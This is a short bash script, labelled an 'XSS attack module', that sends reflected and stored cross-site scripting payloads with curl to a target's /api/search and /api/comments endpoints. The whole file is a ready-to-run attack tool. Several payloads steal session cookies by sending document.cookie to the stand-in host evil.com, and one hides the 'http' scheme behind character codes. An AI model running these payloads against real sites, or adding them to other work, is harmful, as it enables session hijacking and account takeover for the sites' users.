#!/bin/bash
TARGET="$1"

echo "========================================="
echo "[*] XSS ATTACK MODULE"
echo "[*] Target: $TARGET"
echo "[*] Tool: curl"
echo "========================================="

echo ""
echo "[*] Phase 1: Reflected XSS via /api/search"
echo "---"

declare -a SEARCH_PAYLOADS=(
  '<script>alert("XSS")</script>'
  '<script>document.location="http://evil.com/?c="+document.cookie</script>'
  '<img src=x onerror=alert(1)>'
  '<svg onload=alert("SVG_XSS")>'
  '<iframe src="javascript:alert(1)">'
  '<body onload=alert("BODY_XSS")>'
  'javascript:alert(document.cookie)'
)

for payload in "${SEARCH_PAYLOADS[@]}"; do
  echo "[>] Payload: $payload"
  curl -s -X POST "$TARGET/api/search" \
    -H "Content-Type: application/json" \
    -d "{\"query\": $(echo "$payload" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read().strip()))')}"
  echo ""
done

echo ""
echo "[*] Phase 2: Stored XSS via /api/comments"
echo "---"

declare -a COMMENT_PAYLOADS=(
  '<script>alert("STORED_XSS")</script>'
  '<img src=x onerror="fetch(String.fromCharCode(104,116,116,112)+\"://evil.com/?c=\"+document.cookie)">'
  '<script>new Image().src="http://evil.com/steal?cookie="+document.cookie</script>'
  '<svg/onload=alert("SVG")>'
  '<marquee onstart=alert("XSS")>test</marquee>'
  '<details open ontoggle=alert("XSS")>'
  '<input onfocus=alert("XSS") autofocus>'
)

for payload in "${COMMENT_PAYLOADS[@]}"; do
  echo "[>] Payload: $payload"
  curl -s -X POST "$TARGET/api/comments" \
    -H "Content-Type: application/json" \
    -d "{\"comment\": $(echo "$payload" | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read().strip()))')}"
  echo ""
done

echo ""
echo "========================================="
echo "[+] XSS attack module complete"
echo "========================================="
